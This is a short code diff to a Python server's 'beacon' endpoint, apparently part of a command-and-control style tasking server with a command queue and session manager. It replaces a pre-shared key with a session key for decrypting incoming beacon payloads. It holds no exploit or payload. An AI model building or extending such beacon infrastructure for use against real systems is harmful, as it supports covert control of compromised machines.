@@ -9,6 +9,7 @@ from common.utils import CryptoError, ProtocolError
 from server.command_queue import CommandQueue, TaskStatus
 from server.session_manager import SessionManager
 from server.storage import Database
+from common.crypto import get_session_key
 
 logger = get_logger('server')
 
@@ -59,7 +60,8 @@ async def beacon(request: Request) -> Response:
 
     # Step 2 — unpack and decrypt
     try:
-        payload = mf.unpack(raw_body, config.PRE_SHARED_KEY)
+        session_key = get_session_key()
+        payload = mf.unpack(raw_body, session_key)
     except (ProtocolError, CryptoError) as e:
         logger.warning('unpack failed', extra={'source_ip': source_ip, 'reason': str(e)})
         return JSONResponse(status_code=400, content={'error': 'bad request'})
